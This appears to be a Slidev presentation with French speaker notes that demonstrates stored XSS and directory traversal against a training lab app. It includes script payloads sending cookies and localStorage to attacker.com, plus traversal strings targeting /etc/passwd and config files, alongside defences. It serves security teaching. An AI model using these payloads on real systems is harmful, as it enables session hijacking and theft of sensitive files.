---
layout: section
---

# Live Demonstrations

<div class="slide-number">
  <SlideCurrentNo />/<SlideTotalNo />
</div>

---
layout: default
---

# Stored XSS Attack

<div class="grid grid-cols-2 gap-8">
  <div>
    <h3 class="uppercase text-gray-400 tracking-wider mb-4">Advanced Payload</h3>

```js
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '<http://attacker.com/?cookie=>' 
            + document.cookie);
  xhr.send();

  document.body.style.backgroundColor = 'red';
  alert('XSS Démonstration');
</script>
```
  </div>

  <div>
    <h3 class="uppercase text-gray-400 tracking-wider mb-4">Attack Process</h3>
    <div class="space-y-4">
      <p>1. Navigate to "Stored XSS Blog"</p>
      <p>2. Post a normal message first</p>
      <p>3. Submit XSS payload</p>
      <p>4. Observe execution on each visit</p>
    </div>
  </div>
</div>

<div class="slide-number">
  <SlideCurrentNo />/<SlideTotalNo />
</div>

<!--
### Description

Le XSS stocké est une vulnérabilité où du code malveillant est stocké dans la base de données et exécuté à chaque fois qu'un utilisateur visite la page affectée.

### Étapes de la démonstration

1. **Accès à la vulnérabilité**
    - Naviguer vers "Cross-Site Scripting - Stored (Blog)"
    - Observer l'interface du blog
2. **Test de fonctionnement normal**
    
    ```
    Message : Hello World!
    
    ```
    
    - Le message s'affiche normalement
    - Montrer qu'il est stocké en rafraîchissant la page
3. **Exploitation**
    
    ```jsx
    <script>
      // Vol de cookies
      var xhr = new XMLHttpRequest();
      xhr.open('GET', '<http://attacker.com/?cookie=>' + document.cookie);
      xhr.send();
    
      // Effet visuel pour la démo
      document.body.style.backgroundColor = 'red';
      alert('XSS Démonstration');
    </script>
    
    ```
    
    ```jsx
    <script>
      // Récupérer les données de l'utilisateur
      var userData = {
        url: window.location.href,
        userAgent: navigator.userAgent,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        screenRes: `${window.screen.width}x${window.screen.height}`
      };
    
      // Afficher les informations volées
      alert("🚨 Données sensibles exposées:\n\n" + 
            "📍 URL: " + userData.url + "\n\n" + 
            "🔍 User-Agent: " + userData.userAgent + "\n\n" +
            "🍪 Cookies: " + userData.cookies + "\n\n" +
            "💾 LocalStorage: " + userData.localStorage + "\n\n" +
            "📱 Résolution: " + userData.screenRes);
    
      // Simuler l'envoi à un serveur malveillant
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'http://attacker.com/steal?' + new URLSearchParams(userData));
      xhr.send();
    
      // Effet visuel
      document.body.style.backgroundColor = 'red';
      document.body.innerHTML = '<h1 style="color:white;text-align:center;margin-top:50px">🚨 Votre système a été compromis 🚨</h1>';
    </script>
    ```
    

### Impacts potentiels

- Vol de session utilisateur
- Modification du contenu de la page
- Exécution de code arbitraire
- Redirection des utilisateurs
- Vol de données sensibles

### Mesures de protection

1. **Validation des entrées**
    - Filtrer les caractères spéciaux
    - Utiliser des listes blanches
2. **Échappement des sorties**
    
    ```php
    htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
    
    ```
    
3. **Headers de sécurité**
    
    ```
    Content-Security-Policy: default-src 'self'
    X-XSS-Protection: 1; mode=block
    
    ```
-->

---
layout: default
---

# Directory Traversal

<div class="grid grid-cols-2 gap-8">
  <div>
    <h3 class="uppercase text-gray-400 tracking-wider mb-4">Target Files</h3>

```bash
# System Files
../../../etc/passwd
../../../etc/hosts
../../../etc/hostname

# Application Files
../../../var/www/html/config.php
../../../var/log/apache2/access.log
../../../etc/apache2/apache2.conf
```

  </div>

  <div>
    <h3 class="uppercase text-gray-400 tracking-wider mb-4">Exploitation Steps</h3>
    <div class="space-y-4">
      <p>1. Access "Directory Traversal - Files"</p>
      <p>2. Test normal file access</p>
      <p>3. Use path traversal sequences</p>
      <p>4. Access sensitive files</p>
    </div>
  </div>
</div>

<div class="slide-number">
  <SlideCurrentNo />/<SlideTotalNo />
</div>

<!--
## Démo 2 : Directory Traversal

### Description

Le Directory Traversal permet à un attaquant d'accéder à des fichiers en dehors du répertoire web prévu, en utilisant des séquences comme "../" pour naviguer dans l'arborescence.

### Étapes de la démonstration

1. **Accès à la vulnérabilité**
    - Naviguer vers "Directory Traversal - Files"
    - Observer le comportement normal avec les fichiers autorisés
2. **Test de fichiers système**
    
    ```
    # Test basique
    ../../../etc/passwd
    
    # Version encodée URL
    ..%2F..%2F..%2Fetc%2Fpasswd
    
    # Autres fichiers intéressants
    ../../../etc/hosts
    ../../../etc/apache2/apache2.conf
    ../../../var/log/apache2/access.log
    ../../../var/www/html/config.php
    
    ```
    
3. **Analyse des résultats**
    - Observer le contenu des fichiers accessibles
    - Noter les permissions et les informations exposées
    - Identifier les risques potentiels

### Fichiers intéressants à explorer

1. **Fichiers système**
    - /etc/passwd (utilisateurs)
    - /etc/hosts (configuration réseau)
    - /etc/hostname
2. **Logs**
    - /var/log/apache2/access.log
    - /var/log/apache2/error.log
3. **Configuration**
    - /var/www/html/config.php
    - /etc/apache2/apache2.conf
    - /etc/php/php.ini

### Impacts potentiels

- Accès aux fichiers de configuration
- Fuite d'informations sensibles
- Exposition des logs système
- Divulgation de mots de passe/clés
- Cartographie du système

### Mesures de protection

1. **Validation des chemins**
    
    ```php
    // Vérifier le chemin final
    $finalPath = realpath($userInput);
    if (strpos($finalPath, '/var/www/allowed') !== 0) {
        die('Accès interdit');
    }
    
    ```
    
2. **Restrictions d'accès**
    - Utiliser chroot
    - Limiter les permissions
    - Implémenter des listes blanches
3. **Configuration serveur**
    
    ```
    <Directory />
        Options -Indexes
        AllowOverride None
        Order allow,deny
        Deny from all
    </Directory>
    
    ```
    

### Bonnes pratiques générales

1. **Principe du moindre privilège**
    - Limiter les permissions des utilisateurs
    - Séparer les environnements
2. **Surveillance et logging**
    - Activer les logs détaillés
    - Monitorer les accès suspects
3. **Sécurité en profondeur**
    - Validations multiples
    - Contrôles à différents niveaux
-->

---
layout: default
---

# Security Impact

<div class="grid grid-cols-2 gap-8">
  <div class="bg-red-50/20 p-6 rounded-lg">
    <h3 class="font-bold mb-4">XSS Impact</h3>
    <div class="space-y-2">
      <p>• Session hijacking</p>
      <p>• Data theft</p>
      <p>• Page defacement</p>
      <p>• Malicious redirects</p>
    </div>
  </div>

  <div class="bg-blue-50/20 p-6 rounded-lg">
    <h3 class="font-bold mb-4">Directory Traversal Impact</h3>
    <div class="space-y-2">
      <p>• Configuration exposure</p>
      <p>• System information leak</p>
      <p>• Sensitive data access</p>
      <p>• Log file disclosure</p>
    </div>
  </div>
</div>

<div class="slide-number">
  <SlideCurrentNo />/<SlideTotalNo />
</div>

<!--
Cette slide est essentielle pour résumer l'impact réel des vulnérabilités que nous venons de démontrer.

Du côté du XSS stocké, les conséquences sont particulièrement graves. Le vol de session permet à un attaquant de se connecter en tant que victime. Toutes les données personnelles peuvent être dérobées. La défiguration de page et les redirections malveillantes affectent l'intégrité du site. Le plus dangereux est que ces attaques touchent tous les visiteurs.

Concernant le Directory Traversal, l'impact se situe au niveau de la confidentialité des données. L'accès aux fichiers de configuration expose les paramètres sensibles du serveur. La fuite des logs permet de cartographier le système. Ces informations constituent une base solide pour des attaques plus sophistiquées.

Ces vulnérabilités montrent qu'une simple faille peut compromettre l'ensemble du système. C'est pourquoi il est crucial d'appliquer les bonnes pratiques de sécurité dès la conception de l'application.
-->
